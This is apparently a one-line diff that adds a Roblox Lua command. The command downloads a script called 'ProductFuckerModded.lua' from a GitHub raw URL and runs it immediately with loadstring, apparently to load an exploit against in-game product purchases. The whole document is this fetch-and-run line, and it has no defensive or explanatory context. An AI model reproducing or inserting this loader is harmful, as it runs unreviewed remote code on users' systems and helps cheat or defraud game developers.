@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BahServerSide/ScriptByBah/refs/heads/main/ProductFuckerModded.lua"))()
